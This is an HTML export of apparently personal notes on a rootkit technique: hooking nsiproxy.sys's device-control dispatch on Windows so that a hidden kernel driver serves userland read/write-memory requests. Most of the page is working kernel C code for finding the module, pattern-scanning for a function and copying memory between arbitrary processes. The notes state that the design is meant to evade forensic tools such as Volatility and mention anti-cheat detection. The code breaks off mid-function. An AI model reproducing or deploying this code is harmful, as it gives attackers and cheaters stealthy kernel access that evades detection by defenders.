<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Driver's IO Control</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1># Hook Driver&#39;s IO Control</h1><br />â€¢ <a href="https://github.com/SamuelTulach/memdrv">https://github.com/SamuelTulach/memdrv</a> - Big credit goes here<br /><br />Because you&#39;re running in the kernel, at the same privilege level as other objects, <br />you can grab any object on the system (objects like drivers, etc.)<br /><br />The premise in this technique is to hook another driver&#39;s IO control function, the <br /><code>DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]</code><br />to point to your own IO control function in your own driver.<br /><br />This makes userland &lt;--&gt; kerneland communication obscurred <br />because you&#39;re sending IO commands to an exisitng, legitimate driver<br />(but executing your IO commands like reading/writing kernel memory will still be done your installed driver)<br /><br />In this example we target <code>nsiproxy.sys</code>.<br />Our kernel driver will go like this:<br />1. Enumerate objects in the kernel to find nsiproxy.sys<br />2. Find a function in nsiproxy.sys to hook (e.g. NsippCreateDevice)<br />3. Overwrite nsiproxy.sys&#39;s IRP_MJ_DEVICE_CONTROL to point to NsippCreateDevice<br />4. Hooks NsippCreateDevice to point to our own IoControl function in our own driver<br /><br />Lastly from userland, we open nsiproxy.sys and send IO commands to it.<br /><br />Why do we redirect IRP_MJ_DEVICE_CONTROL to an existing function in the driver and not straight into our own IO control function?<br />Because forensic tools like volitility can list each of the functions in the IRP table and what module they point to.<br />If an IRP function in <code>tcpip.sys</code> points t <code>drivery.sys</code>, it&#39;s fairly obvious that the tcpip.sys has been hooked.<br /><a href=""><img src="images/1821-1.png" alt="images/1821-1.png" /></a><br /><br />(credit here: <a href="https://www.tophertimzen.com/resources/cs407/slides/week06_01-Rootkits.html#slide34">https://www.tophertimzen.com/resources/cs407/slides/week06_01-Rootkits.html#slide34</a>)<br /><br /><h2>## Defense</h2><br /><h3>### </h3><strong><h3>PatchGuard?</h3></strong><br />I don&#39;t know whether PatchGuard protects against this or not.<br />In theory it shouldn&#39;t as PatchGuard apprently doesn&#39;t protect against driver to driver hooks, only against modifications to integral kernel structures.<br /><br />I left my computer on for ~4 hours and PatchGuard didn&#39;t BSOD me so maybe it doesn&#39;t :shrug:<br /><br /><h3>### Compare the driver&#39;s dispatch functions on disk to those in memory</h3><br />The <code>DriverObject-&gt;MajorFunction</code> is the driver&#39;s dispatch table.<br />(Refer to the MajorFunction heading<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object</a>)<br /><br />EasyAntiCheat compares the driver&#39;s dispatch table on disk to the one in memory.<br />If there&#39;s a difference, then the driver&#39;s dispatch table has been modified.<br /><br /><h2>## Code</h2><br />For complete code:<br /><a href="https://github.com/pwncone/towel/tree/main/kernel/hooking/IOcontrol_hook">https://github.com/pwncone/towel/tree/main/kernel/hooking/IOcontrol_hook</a><br /><br /><h3>### Kernel land</h3><br /><div class="codebox"><div class="codebox">/*<br />Use&nbsp;a&nbsp;different&nbsp;driver&nbsp;to&nbsp;send&nbsp;control&nbsp;codes&nbsp;to<br />and&nbsp;do&nbsp;your&nbsp;read/write&nbsp;memory&nbsp;bidding&nbsp;for&nbsp;you.<br />This&nbsp;version&nbsp;uses&nbsp;nsiproxy.sys.&nbsp;<br />Credit&nbsp;goes&nbsp;here:&nbsp;https://github.com/SamuelTulach/memdrv<br /><br />1.&nbsp;Finds&nbsp;nsiproxy.sys.<br />2.&nbsp;Finds&nbsp;NsippCreateDevice&nbsp;in&nbsp;nsiproxy.sys<br />3.&nbsp;Overwrites&nbsp;nsiproxy.sys&#39;s&nbsp;IoControl&nbsp;to&nbsp;NsippCreateDevice.<br />4.&nbsp;Hooks&nbsp;NsippCreateDevice&nbsp;to&nbsp;point&nbsp;to&nbsp;our&nbsp;own&nbsp;IoControl&nbsp;function.<br /><br />When&nbsp;a&nbsp;control&nbsp;code&nbsp;is&nbsp;sent&nbsp;to&nbsp;nsiproxy.sys,&nbsp;it&nbsp;will&nbsp;detour&nbsp;to&nbsp;NsippCreateDevice.<br />NsippCreateDevice&nbsp;will&nbsp;detour&nbsp;to&nbsp;our&nbsp;own&nbsp;IoControl&nbsp;function.<br />If&nbsp;it&#39;s&nbsp;not&nbsp;an&nbsp;IO&nbsp;code&nbsp;we&nbsp;care&nbsp;to&nbsp;handle&nbsp;(read/write&nbsp;memory),<br />send&nbsp;the&nbsp;control&nbsp;code&nbsp;back&nbsp;to&nbsp;nsiproxy.sys&#39;s&nbsp;IoControl&nbsp;function.<br /><br />DO&nbsp;NOTE!:<br />-&nbsp;You&nbsp;can&nbsp;unload&nbsp;this&nbsp;driver,&nbsp;but&nbsp;you&nbsp;will&nbsp;BSOD&nbsp;as&nbsp;soon&nbsp;as&nbsp;you&nbsp;do.<br />-&nbsp;To&nbsp;successfully&nbsp;unload&nbsp;without&nbsp;BSOD,&nbsp;restore&nbsp;the&nbsp;hook:<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;restore&nbsp;the&nbsp;original&nbsp;bytes<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;restore&nbsp;the&nbsp;target&nbsp;driver&#39;s&nbsp;IRP_MJ_DEVICE_CONTROL&nbsp;pointer<br />Should&nbsp;work&nbsp;in&nbsp;theory.&nbsp;Haven&#39;t&nbsp;tested.<br />*/<br /><br />#include&nbsp;&lt;ntddk.h&gt;<br />#include&nbsp;&lt;windef.h&gt;<br />#include&nbsp;&lt;ntimage.h&gt;<br /><br />#include&nbsp;&quot;nt.h&quot;<br />//#include&nbsp;&lt;ntifs.h&gt;<br /><br />#define&nbsp;Dbg(...)&nbsp;DbgPrintEx(&nbsp;DPFLTR_SYSTEM_ID,&nbsp;DPFLTR_ERROR_LEVEL,&nbsp;&quot;[yoink]&nbsp;&quot;&nbsp;__VA_ARGS__&nbsp;)<br /><br />#define&nbsp;IOCTL_YOINKED_READ_MEMORY&nbsp;CTL_CODE(FILE_DEVICE_UNKNOWN,&nbsp;0x801,&nbsp;METHOD_BUFFERED,&nbsp;FILE_ANY_ACCESS)<br />#define&nbsp;IOCTL_YOINKED_WRITE_MEMORY&nbsp;CTL_CODE(FILE_DEVICE_UNKNOWN,&nbsp;0X802,&nbsp;METHOD_BUFFERED,&nbsp;FILE_ANY_ACCESS)<br /><br />//&nbsp;---------------------------------------------------------<br />//&nbsp;Util<br />//&nbsp;---------------------------------------------------------<br />PVOID&nbsp;FindModuleBase(char*&nbsp;module_name)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;module_base&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;buffer_size&nbsp;=&nbsp;8;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;info_buffer&nbsp;=&nbsp;ExAllocatePool2(POOL_FLAG_NON_PAGED,&nbsp;buffer_size,&nbsp;&#39;1luL&#39;);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Enumerate&nbsp;the&nbsp;loaded&nbsp;modules&nbsp;on&nbsp;the&nbsp;system<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;return_len&nbsp;=&nbsp;0;<br />&nbsp;&nbsp;&nbsp;&nbsp;NTSTATUS&nbsp;status&nbsp;=&nbsp;ZwQuerySystemInformation(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SystemModuleInformation,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info_buffer,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer_size,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;return_len<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(status&nbsp;==&nbsp;STATUS_INFO_LENGTH_MISMATCH)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Resize&nbsp;buffer&nbsp;to&nbsp;store&nbsp;returned&nbsp;information<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;and&nbsp;try&nbsp;again<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExFreePool(info_buffer);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer_size&nbsp;=&nbsp;return_len;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info_buffer&nbsp;=&nbsp;ExAllocatePool2(POOL_FLAG_NON_PAGED,&nbsp;buffer_size,&nbsp;&#39;2luL&#39;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;=&nbsp;ZwQuerySystemInformation(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SystemModuleInformation,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info_buffer,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer_size,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;return_len<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!NT_SUCCESS(status))<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExFreePool(info_buffer);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Loop&nbsp;through&nbsp;modules&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;PRTL_PROCESS_MODULES&nbsp;modules&nbsp;=&nbsp;(PRTL_PROCESS_MODULES)info_buffer;<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(ULONG&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;modules-&gt;NumberOfModules;&nbsp;i++)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char*&nbsp;name&nbsp;=&nbsp;(char*)modules-&gt;Modules[i].FullPathName&nbsp;+&nbsp;modules-&gt;Modules[i].OffsetToFileName;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strcmp(name,&nbsp;module_name)&nbsp;==&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;If&nbsp;we&#39;ve&nbsp;found&nbsp;the&nbsp;desired&nbsp;module,&nbsp;save&nbsp;its&nbsp;base&nbsp;address<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;module_base&nbsp;=&nbsp;modules-&gt;Modules[i].ImageBase;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ExFreePool(info_buffer);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;module_base;<br />}<br /><br />BOOL&nbsp;CheckMask(PCHAR&nbsp;base,&nbsp;PCHAR&nbsp;pattern,&nbsp;PCHAR&nbsp;mask)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(*mask&nbsp;!=&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(*mask&nbsp;==&nbsp;&#39;x&#39;&nbsp;&amp;&amp;&nbsp;*base&nbsp;!=&nbsp;*pattern)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;FALSE;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++base;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++pattern;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++mask;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;TRUE;<br />}<br /><br />PVOID&nbsp;FindPattern(PCHAR&nbsp;base,&nbsp;DWORD&nbsp;length,&nbsp;PCHAR&nbsp;pattern,&nbsp;PCHAR&nbsp;mask)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;length&nbsp;-=&nbsp;(DWORD)strlen(mask);<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;length;&nbsp;++i)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;addr&nbsp;=&nbsp;&amp;base[i];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(CheckMask(addr,&nbsp;pattern,&nbsp;mask)&nbsp;==&nbsp;TRUE)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;addr;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;<br />}<br /><br />PVOID&nbsp;FindPatternInModule(PCHAR&nbsp;module_base,&nbsp;PCHAR&nbsp;pattern,&nbsp;PCHAR&nbsp;mask)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;pattern_addr&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Grab&nbsp;sections&nbsp;in&nbsp;module&nbsp;and&nbsp;loop&nbsp;through<br />&nbsp;&nbsp;&nbsp;&nbsp;PIMAGE_NT_HEADERS&nbsp;nt_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)(module_base&nbsp;+&nbsp;((PIMAGE_DOS_HEADER)module_base)-&gt;e_lfanew);<br />&nbsp;&nbsp;&nbsp;&nbsp;PIMAGE_SECTION_HEADER&nbsp;section&nbsp;=&nbsp;IMAGE_FIRST_SECTION(nt_header);<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;nt_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(*(PINT)section-&gt;Name&nbsp;==&nbsp;&#39;EGAP&#39;&nbsp;||&nbsp;memcmp(section-&gt;Name,&nbsp;&quot;.text&quot;,&nbsp;5)&nbsp;==&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;If&nbsp;we&#39;ve&nbsp;found&nbsp;the&nbsp;.text&nbsp;section,&nbsp;search&nbsp;for&nbsp;our&nbsp;pattern<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern_addr&nbsp;=&nbsp;FindPattern(module_base&nbsp;+&nbsp;section-&gt;VirtualAddress,&nbsp;section-&gt;Misc.VirtualSize,&nbsp;pattern,&nbsp;mask);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(pattern_addr&nbsp;!=&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Advance&nbsp;to&nbsp;next&nbsp;section<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;section&nbsp;+=&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;pattern_addr;<br />}<br /><br />//&nbsp;---------------------------------------------------------<br />//&nbsp;Main<br />//&nbsp;---------------------------------------------------------<br />PVOID&nbsp;addr_nsiproxy_IoControl&nbsp;=&nbsp;NULL;<br />typedef&nbsp;NTSTATUS(WINAPI*&nbsp;t_IoControl)(PDEVICE_OBJECT&nbsp;DeviceObject,&nbsp;PIRP&nbsp;Irp);<br /><br />typedef&nbsp;struct&nbsp;_KERNEL_READ<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD32&nbsp;process_id;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;from;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;to;<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;size;<br />}&nbsp;KernelRead;<br /><br />typedef&nbsp;struct&nbsp;_KERNEL_WRITE<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD32&nbsp;process_id;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;data_addr;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;to;<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;data_size;<br />}&nbsp;KernelWrite;<br /><br />NTSTATUS&nbsp;IoControl(PDEVICE_OBJECT&nbsp;DeviceObject,&nbsp;PIRP&nbsp;Irp)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;t_IoControl&nbsp;nsiproxy_IoControl&nbsp;=&nbsp;(t_IoControl)addr_nsiproxy_IoControl;<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;*&nbsp;HOOKED&nbsp;nsiproxy.sys&nbsp;IoControl&nbsp;\n&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PIO_STACK_LOCATION&nbsp;stack&nbsp;=&nbsp;IoGetCurrentIrpStackLocation(Irp);<br />&nbsp;&nbsp;&nbsp;&nbsp;NTSTATUS&nbsp;status&nbsp;=&nbsp;STATUS_SUCCESS;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Grab&nbsp;control&nbsp;code<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;code&nbsp;=&nbsp;stack-&gt;Parameters.DeviceIoControl.IoControlCode;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(code&nbsp;==&nbsp;IOCTL_YOINKED_READ_MEMORY)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Data&nbsp;from&nbsp;userland<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KernelRead*&nbsp;read&nbsp;=&nbsp;(KernelRead*)Irp-&gt;AssociatedIrp.SystemBuffer;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;*&nbsp;READ&nbsp;REQUEST&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;*&nbsp;[pid]&nbsp;%d&nbsp;[size]&nbsp;%lld&nbsp;[from]&nbsp;0x%p&nbsp;[to]&nbsp;0x%p&nbsp;\n&quot;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read-&gt;process_id,&nbsp;read-&gt;size,&nbsp;read-&gt;from,&nbsp;read-&gt;to);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Grab&nbsp;EPROCESS&nbsp;of&nbsp;target&nbsp;process<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEPROCESS&nbsp;current_proc&nbsp;=&nbsp;IoGetCurrentProcess();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEPROCESS&nbsp;target_proc&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PsLookupProcessByProcessId((HANDLE)read-&gt;process_id,&nbsp;&amp;target_proc);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Read&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;bytes_read&nbsp;=&nbsp;0;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;=&nbsp;MmCopyVirtualMemory(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target_proc,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read-&gt;from,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_proc,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read-&gt;to,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read-&gt;size,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExGetPreviousMode(),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;bytes_read<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(NT_SUCCESS(status))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;READ&nbsp;SUCCESS&nbsp;[bytes_read]&nbsp;%lld&nbsp;\n&quot;,&nbsp;bytes_read);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;-&nbsp;READ&nbsp;FAILURE.&nbsp;NTSTATUS&nbsp;ERROR:&nbsp;0x%x&nbsp;\n&quot;,&nbsp;status);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ObDereferenceObject(target_proc);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Irp-&gt;IoStatus.Status&nbsp;=&nbsp;status;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Irp-&gt;IoStatus.Information&nbsp;=&nbsp;sizeof(read);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IoCompleteRequest(Irp,&nbsp;IO_NO_INCREMENT);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;STATUS_SUCCESS;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(code&nbsp;==&nbsp;IOCTL_YOINKED_WRITE_MEMORY)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Data&nbsp;from&nbsp;userland<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KernelWrite*&nbsp;write&nbsp;=&nbsp;(KernelWrite*)Irp-&gt;AssociatedIrp.SystemBuffer;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;*&nbsp;WRITE&nbsp;REQUEST&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;*&nbsp;[pid]&nbsp;%d&nbsp;[data&nbsp;size]&nbsp;%lld&nbsp;[addr]&nbsp;0x%p&nbsp;\n&quot;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-&gt;process_id,&nbsp;write-&gt;data_size,&nbsp;write-&gt;to);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Grab&nbsp;EPROCESS&nbsp;of&nbsp;target&nbsp;process<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEPROCESS&nbsp;current_proc&nbsp;=&nbsp;IoGetCurrentProcess();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEPROCESS&nbsp;target_proc&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PsLookupProcessByProcessId((HANDLE)write-&gt;process_id,&nbsp;&amp;target_proc);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Write&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;bytes_ret&nbsp;=&nbsp;0;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;=&nbsp;MmCopyVirtualMemory(<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_proc,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-&gt;data_addr,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target_proc,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-&gt;to,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-&gt;data_size,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExGetPreviousMode(),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;bytes_ret<br 